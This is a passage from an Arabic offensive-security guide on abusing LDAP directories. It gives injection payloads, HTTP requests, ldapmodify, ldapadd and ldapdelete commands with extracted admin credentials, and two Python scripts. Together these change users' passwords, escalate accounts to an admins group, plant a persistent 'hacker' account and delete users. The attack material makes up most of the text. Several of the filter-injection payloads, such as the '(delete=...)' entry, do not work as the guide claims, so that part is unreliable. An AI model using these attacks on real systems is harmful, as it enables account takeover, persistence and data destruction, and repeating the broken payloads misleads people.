
## الخطوات العملية لتعديل بيانات الديركتوري
1. **إعداد البيئة**:
   - استخدم **Burp Suite** أو **OWASP ZAP** لمراقبة وتعديل الطلبات.
   - جهّز أدوات LDAP مثل `ldapmodify` أو `ldapadd` إذا كنت تملك بيانات اعتماد.
   - حدد واجهات التطبيق التي تتفاعل مع LDAP (مثل نموذج تعديل المستخدمين أو واجهة إدارية).
2. **التأكد من الوصول الإداري**:
   - استخدم بيانات الاعتماد المستخلصة (مثل `administrator:MYKE`) لتسجيل الدخول إلى واجهة إدارية.
   - تحقق مما إذا كان التطبيق يسمح بتعديل الديركتوري (مثل واجهة `/admin/users`).
3. **اختبار تعديل البيانات عبر LDAP Injection**:
   - أدخل استعلامات في حقول إدخال لمحاولة تعديل خصائص مثل `userPassword` أو `mail`.
   - راقب استجابات التطبيق لتأكيد نجاح التعديل.
4. **استخدام أدوات LDAP مباشرة**:
   - إذا كنت تملك وصولًا إداريًا، استخدم `ldapmodify` أو `ldapadd` لتغيير أو إضافة كائنات.
5. **أتمتة العملية**:
   - استخدم سكربتات لإرسال طلبات تعديل أو إنشاء كائنات تلقائيًا عبر واجهة التطبيق أو أدوات LDAP.

---

## جميع المحاولات الممكنة لتعديل بيانات الديركتوري
سأقسم المحاولات إلى ثلاث فئات رئيسية:
1. **تعديل بيانات المستخدمين الحاليين**: تغيير خصائص مثل `userPassword`, `mail`, أو `memberOf`.
2. **إضافة كائنات جديدة**: إنشاء مستخدمين أو مجموعات جديدة.
3. **حذف كائنات من الديركتوري**: إزالة مستخدمين أو كائنات أخرى.

### 1. تعديل بيانات المستخدمين الحاليين
الهدف هو تغيير خصائص مستخدم موجود (مثل `user1`)، مثل كلمة المرور أو العضوية في مجموعة.

#### أ. تعديل كلمة المرور عبر واجهة التطبيق
- **السيناريو**: لاحظت أن واجهة `/admin/change_password` تتفاعل مع LDAP لتغيير كلمة المرور. تستغل الثغرة لتغيير كلمة مرور `user1`.
- **الإدخال**:
  - Username: `user1*)(uid=user1)(userPassword=newpass123)`
  - New Password: `anything`
- **الطلب**:
  ```
  POST /admin/change_password HTTP/1.1
  Host: example.com
  Content-Type: application/x-www-form-urlencoded

  username=user1*)(uid=user1)(userPassword=newpass123)&new_password=anything
  ```
- **كيف يعمل**:
  - الاستعلام يحاول تعديل `userPassword` لـ `user1` إلى `newpass123`.
  - إذا كان التطبيق يمرر المدخلات مباشرة إلى LDAP دون تصفية، يتم تغيير كلمة المرور.
  - استجابة إيجابية (مثل رمز 200 أو "Password changed") تؤكد نجاح التعديل.
- **متى يُستخدم؟**:
  - عندما يكون هناك واجهة تتيح تغيير كلمة المرور وتتأثر بـ LDAP Injection.
- **الأوامر/الإجراءات**:
  - في Burp Suite Repeater، أرسل الطلب أعلاه.
  - تحقق من تسجيل الدخول بـ `user1:newpass123`:
    ```
    POST /login HTTP/1.1
    Host: example.com
    Content-Type: application/x-www-form-urlencoded

    username=user1&password=newpass123
    ```

#### ب. تعديل خاصية أخرى (مثل `mail`)
- **السيناريو**: تريد تغيير بريد `user1` إلى `hacker@domain.com` عبر واجهة `/admin/update_profile`.
- **الإدخال**:
  - Username: `user1*)(uid=user1)(mail=hacker@domain.com)`
  - Email: `anything`
- **الطلب**:
  ```
  POST /admin/update_profile HTTP/1.1
  Host: example.com
  Content-Type: application/x-www-form-urlencoded

  username=user1*)(uid=user1)(mail=hacker@domain.com)&email=anything
  ```
- **كيف يعمل**:
  - الاستعلام يحاول تعديل خاصية `mail` لـ `user1`.
  - استجابة إيجابية (مثل "Profile updated") تؤكد التغيير.
  - يمكن التحقق من التعديل باستعلام بحث:
    ```
    POST /search HTTP/1.1
    Host: example.com
    Content-Type: application/x-www-form-urlencoded

    search=*)(mail=hacker@domain.com)
    ```
- **متى يُستخدم؟**:
  - عندما يسمح التطبيق بتعديل خصائص أخرى غير كلمة المرور.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحقق من التعديل باستعلام بحث أو تسجيل الدخول.

#### ج. تعديل عضوية المجموعة (Group Membership)
- **السيناريو**: تريد إضافة `user1` إلى مجموعة إدارية (`cn=admins`) عبر واجهة `/admin/update_group`.
- **الإدخال**:
  - Username: `user1*)(uid=user1)(memberOf=cn=admins,dc=domain,dc=com)`
  - Group: `anything`
- **الطلب**:
  ```
  POST /admin/update_group HTTP/1.1
  Host: example.com
  Content-Type: application/x-www-form-urlencoded

  username=user1*)(uid=user1)(memberOf=cn=admins,dc=domain,dc=com)&group=anything
  ```
- **كيف يعمل**:
  - الاستعلام يحاول تعديل خاصية `memberOf` لإضافة `user1` إلى مجموعة `admins`.
  - إذا نجح، يحصل `user1` على صلاحيات إدارية.
  - تحقق من التعديل بتسجيل الدخول بـ `user1` والتحقق من الصلاحيات.
- **متى يُستخدم؟**:
  - عندما تريد رفع صلاحيات مستخدم موجود.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحقق من الصلاحيات:
    ```
    POST /login HTTP/1.1
    Host: example.com
    Content-Type: application/x-www-form-urlencoded

    username=user1&password=user1pass
    ```

#### د. استخدام `ldapmodify` مع بيانات اعتماد إدارية
- **السيناريو**: لديك بيانات اعتماد إدارية (`administrator:MYKE`) وتريد تعديل `userPassword` لـ `user1`.
- **الأوامر**:
  - أنشئ ملف LDIF (`modify_user1.ldif`):
    ```
    dn: uid=user1,dc=domain,dc=com
    changetype: modify
    replace: userPassword
    userPassword: newpass123
    ```
  - شغّل `ldapmodify`:
    ```
    ldapmodify -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE -f modify_user1.ldif
    ```
- **كيف يعمل**:
  - `ldapmodify` يرسل طلب تعديل إلى خادم LDAP لتغيير `userPassword`.
  - إذا نجح، يتم تحديث كلمة المرور.
- **متى يُستخدم؟**:
  - عندما تملك بيانات اعتماد إدارية ووصول مباشر إلى خادم LDAP.
- **الأوامر/الإجراءات**:
  - قم بتثبيت `ldap-utils`: `sudo apt install ldap-utils`
  - أنشئ ملف LDIF وشغّل الأمر أعلاه.
  - تحقق من التعديل بتسجيل الدخول بـ `user1:newpass123`.

### 2. إضافة كائنات جديدة
الهدف هو إنشاء مستخدمين أو مجموعات جديدة لضمان وصول دائم أو توسيع الهجوم.

#### أ. إضافة مستخدم جديد عبر واجهة التطبيق
- **السيناريو**: واجهة `/admin/add_user` تتفاعل مع LDAP وتتأثر بـ LDAP Injection.
- **الإدخال**:
  - Username: `hacker)(uid=hacker)(objectClass=inetOrgPerson)(userPassword=hacker123)(cn=Hacker)`
  - Password: `anything`
- **الطلب**:
  ```
  POST /admin/add_user HTTP/1.1
  Host: example.com
  Content-Type: application/x-www-form-urlencoded

  username=hacker)(uid=hacker)(objectClass=inetOrgPerson)(userPassword=hacker123)(cn=Hacker)&password=anything
  ```
- **كيف يعمل**:
  - الاستعلام يحاول إنشاء مستخدم جديد (`uid=hacker`) مع كلمة مرور `hacker123`.
  - استجابة إيجابية (مثل "User added") تؤكد نجاح الإضافة.
  - تحقق بتسجيل الدخول بـ `hacker:hacker123`.
- **متى يُستخدم؟**:
  - عندما يسمح التطبيق بإضافة مستخدمين عبر واجهة متأثرة بـ LDAP Injection.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحقق من المستخدم:
    ```
    POST /login HTTP/1.1
    Host: example.com
    Content-Type: application/x-www-form-urlencoded

    username=hacker&password=hacker123
    ```

#### ب. إضافة مستخدم جديد باستخدام `ldapadd`
- **السيناريو**: لديك بيانات اعتماد إدارية (`administrator:MYKE`) وتريد إضافة مستخدم `hacker`.
- **الأوامر**:
  - أنشئ ملف LDIF (`add_hacker.ldif`):
    ```
    dn: uid=hacker,dc=domain,dc=com
    objectClass: inetOrgPerson
    uid: hacker
    cn: Hacker
    sn: Hacker
    userPassword: hacker123
    ```
  - شغّل `ldapadd`:
    ```
    ldapadd -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE -f add_hacker.ldif
    ```
- **كيف يعمل**:
  - `ldapadd` يرسل طلب إنشاء كائن جديد إلى خادم LDAP.
  - إذا نجح، يتم إضافة المستخدم `hacker`.
- **متى يُستخدم؟**:
  - عندما تملك وصولًا إداريًا ووصول مباشر إلى خادم LDAP.
- **الأوامر/الإجراءات**:
  - أنشئ ملف LDIF وشغّل الأمر أعلاه.
  - تحقق من المستخدم بتسجيل الدخول أو استعلام بحث:
    ```
    ldapsearch -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE -b "uid=hacker,dc=domain,dc=com"
    ```

#### ج. إضافة مستخدم إلى مجموعة إدارية
- **السيناريو**: تريد إضافة المستخدم `hacker` إلى مجموعة `admins` عبر واجهة `/admin/add_group_member`.
- **الإدخال**:
  - Username: `hacker)(uid=hacker)(memberOf=cn=admins,dc=domain,dc=com)`
  - Group: `anything`
- **الطلب**:
  ```
  POST /admin/add_group_member HTTP/1.1
  Host: example.com
  Content-Type: application/x-www-form-urlencoded

  username=hacker)(uid=hacker)(memberOf=cn=admins,dc=domain,dc=com)&group=anything
  ```
- **كيف يعمل**:
  - الاستعلام يحاول إضافة `hacker` إلى مجموعة `admins`.
  - استجابة إيجابية تؤكد نجاح الإضافة.
- **متى يُستخدم؟**:
  - لمنح صلاحيات إدارية لمستخدم جديد أو موجود.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحقق من الصلاحيات بتسجيل الدخول بـ `hacker:hacker123`.

### 3. حذف كائنات من الديركتوري
الهدف هو إزالة مستخدمين أو كائنات من الديركتوري لتعطيل النظام أو إزالة تهديدات.

#### أ. حذف مستخدم عبر واجهة التطبيق
- **السيناريو**: واجهة `/admin/delete_user` تتفاعل مع LDAP وتتأثر بـ LDAP Injection.
- **الإدخال**:
  - Username: `user1)(uid=user1)(delete=uid=user1,dc=domain,dc=com)`
- **الطلب**:
  ```
  POST /admin/delete_user HTTP/1.1
  Host: example.com
  Content-Type: application/x-www-form-urlencoded

  username=user1)(uid=user1)(delete=uid=user1,dc=domain,dc=com)
  ```
- **كيف يعمل**:
  - الاستعلام يحاول حذف الكائن `uid=user1`.
  - استجابة إيجابية (مثل "User deleted") تؤكد نجاح الحذف.
  - تحقق بمحاولة تسجيل الدخول بـ `user1` (ينبغي أن تفشل).
- **متى يُستخدم؟**:
  - عندما يسمح التطبيق بحذف كائنات عبر واجهة متأثرة.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحقق من الحذف:
    ```
    POST /login HTTP/1.1
    Host: example.com
    Content-Type: application/x-www-form-urlencoded

    username=user1&password=user1pass
    ```

#### ب. حذف مستخدم باستخدام `ldapdelete`
- **السيناريو**: لديك بيانات اعتماد إدارية (`administrator:MYKE`) وتريد حذف `user1`.
- **الأوامر**:
  - شغّل `ldapdelete`:
    ```
    ldapdelete -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE "uid=user1,dc=domain,dc=com"
    ```
- **كيف يعمل**:
  - `ldapdelete` يرسل طلب حذف إلى خادم LDAP.
  - إذا نجح، يتم إزالة `user1`.
- **متى يُستخدم؟**:
  - عندما تملك وصولًا إداريًا ووصول مباشر إلى خادم LDAP.
- **الأوامر/الإجراءات**:
  - شغّل الأمر أعلاه.
  - تحقق من الحذف باستعلام بحث:
    ```
    ldapsearch -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE -b "uid=user1,dc=domain,dc=com"
    ```

---

## أتمتة تعديل بيانات الديركتوري
تعديل البيانات يدويًا قد يكون بطيئًا، خاصة إذا كنت تستهدف عدة مستخدمين أو كائنات. يمكنك أتمتة العملية باستخدام سكربت Python.

#### سكربت Python لتعديل كلمة المرور عبر واجهة التطبيق
```python
#!/usr/bin/python3
import requests

url = "http://example.com/admin/change_password"  # استبدل بـ URL الواجهة
users = ["user1", "user2"]  # قائمة المستخدمين المستهدفين
new_password = "newpass123"

for user in users:
    payload = f"{user}*)(uid={user})(userPassword={new_password})"
    data = {"username": payload, "new_password": "anything"}
    r = requests.post(url, data=data)
    if "Password changed" in r.text or r.status_code == 200:  # شرط النجاح
        print(f"[+] Password changed for {user} to {new_password}")
    else:
        print(f"[-] Failed to change password for {user}")
```

- **الإعداد**:
  - استبدل `http://example.com/admin/change_password` بعنوان URL الواجهة.
  - استبدل `"Password changed"` بشرط النجاح (مثل نص أو رمز حالة).
  - عدّل `users` و`new_password` حسب الحاجة.
- **التشغيل**:
  - `python3 modify_password.py`
- **المخرجات**:
  - `[+] Password changed for user1 to newpass123`
  - `[+] Password changed for user2 to newpass123`
- **الأوامر/الإجراءات**:
  - احفظ السكربت كـ `modify_password.py` وشغّله.
  - راقب الطلبات في Burp Suite.

#### سكربت Python لإضافة مستخدم جديد
```python
#!/usr/bin/python3
import requests

url = "http://example.com/admin/add_user"  # استبدل بـ URL الواجهة
new_user = "hacker"
new_password = "hacker123"

payload = f"{new_user})(uid={new_user})(objectClass=inetOrgPerson)(userPassword={new_password})(cn={new_user})"
data = {"username": payload, "password": "anything"}
r = requests.post(url, data=data)
if "User added" in r.text or r.status_code == 200:  # شرط النجاح
    print(f"[+] User {new_user} added with password {new_password}")
else:
    print(f"[-] Failed to add user {new_user}")
```

- **الإعداد**:
  - استبدل `http://example.com/admin/add_user` بعنوان URL الواجهة.
  - استبدل `"User added"` بشرط النجاح.
  - عدّل `new_user` و`new_password` حسب الحاجة.
- **التشغيل**:
  - `python3 add_user.py`
- **المخرجات**:
  - `[+] User hacker added with password hacker123`
- **الأوامر/الإجراءات**:
  - احفظ السكربت كـ `add_user.py` وشغّله.
  - تحقق من المستخدم بتسجيل الدخول.

---



## ملخص جميع المحاولات
### تعديل بيانات المستخدمين الحاليين
| **الغرض**                     | **الإدخال/الأمر**                                                                 | **الطلب/الإجراء**                                                                 | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| تعديل كلمة المرور            | `user1*)(uid=user1)(userPassword=newpass123)`                                     | `POST /admin/change_password` with `username=user1*)(uid=user1)(userPassword=newpass123)` | عند وجود واجهة لتغيير كلمة المرور.                                              |
| تعديل خاصية `mail`           | `user1*)(uid=user1)(mail=hacker@domain.com)`                                      | `POST /admin/update_profile` with `username=user1*)(uid=user1)(mail=hacker@domain.com)` | لتغيير خصائص أخرى مثل البريد.                                                   |
| تعديل عضوية المجموعة         | `user1*)(uid=user1)(memberOf=cn=admins,dc=domain,dc=com)`                         | `POST /admin/update_group` with `username=user1*)(uid=user1)(memberOf=cn=admins,dc=domain,dc=com)` | لرفع صلاحيات مستخدم.                                                            |
| تعديل باستخدام `ldapmodify`  | `ldapmodify -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE -f modify_user1.ldif` | Modify `userPassword` via LDIF file                                               | عند وجود وصول إداري مباشر.                                                       |

### إضافة كائنات جديدة
| **الغرض**                     | **الإدخال/الأمر**                                                                 | **الطلب/الإجراء**                                                                 | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| إضافة مستخدم عبر واجهة      | `hacker)(uid=hacker)(objectClass=inetOrgPerson)(userPassword=hacker123)(cn=Hacker)` | `POST /admin/add_user` with `username=hacker)(uid=hacker)(objectClass=inetOrgPerson)(userPassword=hacker123)(cn=Hacker)` | عند وجود واجهة لإضافة مستخدمين.                                                |
| إضافة مستخدم باستخدام `ldapadd` | `ldapadd -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE -f add_hacker.ldif` | Add `hacker` via LDIF file                                                       | عند وجود وصول إداري مباشر.                                                       |
| إضافة إلى مجموعة إدارية     | `hacker)(uid=hacker)(memberOf=cn=admins,dc=domain,dc=com)`                        | `POST /admin/add_group_member` with `username=hacker)(uid=hacker)(memberOf=cn=admins,dc=domain,dc=com)` | لمنح صلاحيات إدارية لمستخدم جديد.                                              |

### حذف كائنات من الديركتوري
| **الغرض**                     | **الإدخال/الأمر**                                                                 | **الطلب/الإجراء**                                                                 | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| حذف مستخدم عبر واجهة        | `user1)(uid=user1)(delete=uid=user1,dc=domain,dc=com)`                            | `POST /admin/delete_user` with `username=user1)(uid=user1)(delete=uid=user1,dc=domain,dc=com)` | عند وجود واجهة لحذف مستخدمين.                                                  |
| حذف مستخدم باستخدام `ldapdelete` | `ldapdelete -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE "uid=user1,dc=domain,dc=com"` | Delete `user1` directly                                                         | عند وجود وصول إداري مباشر.                                                       |

### أتمتة
| **الغرض**                     | **الإدخال/الأمر**                                                                 | **الإجراء**                                                                       | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| أتمتة تعديل كلمة المرور      | `python3 modify_password.py`                                                      | Modify passwords for multiple users                                               | لتعديل بيانات عدة مستخدمين بسرعة.                                               |
| أتمتة إضافة مستخدم           | `python3 add_user.py`                                                             | Add new user `hacker`                                                             | لإنشاء مستخدم جديد تلقائيًا.                                                    |

---

## مثال عملي باستخدام Burp Suite والسكربتات
1. **إعداد Burp Suite**:
   - اضبط الوكيل إلى `127.0.0.1:8080`.
   - اختبر واجهة `/admin/change_password`:
     ```
     POST /admin/change_password HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded

     username=user1*)(uid=user1)(userPassword=newpass123)&new_password=anything
     ```
   - تحقق من الاستجابة (مثل "Password changed").
2. **تعديل كلمة المرور**:
   - استخدم `modify_password.py` لتعديل كلمات مرور `user1` و`user2`.
   - شغّل: `python3 modify_password.py`
   - تحقق من التعديل بتسجيل الدخول بـ `user1:newpass123`.
3. **إضافة مستخدم جديد**:
   - استخدم `add_user.py` لإضافة `hacker`.
   - شغّل: `python3 add_user.py`
   - تحقق بتسجيل الدخول بـ `hacker:hacker123`.
4. **حذف مستخدم**:
   - أرسل طلب حذف في Burp Suite:
     ```
     POST /admin/delete_user HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded

     username=user1)(uid=user1)(delete=uid=user1,dc=domain,dc=com)
     ```
   - تحقق من الحذف بمحاولة تسجيل الدخول بـ `user1`.
5. **استخدام `ldapmodify`**:
   - أنشئ ملف `modify_user1.ldif` وشغّل:
     ```
     ldapmodify -x -H ldap://target_ip -D "cn=administrator,dc=domain,dc=com" -w MYKE -f modify_user1.ldif
     ```
   - تحقق من التعديل بتسجيل الدخول.

---
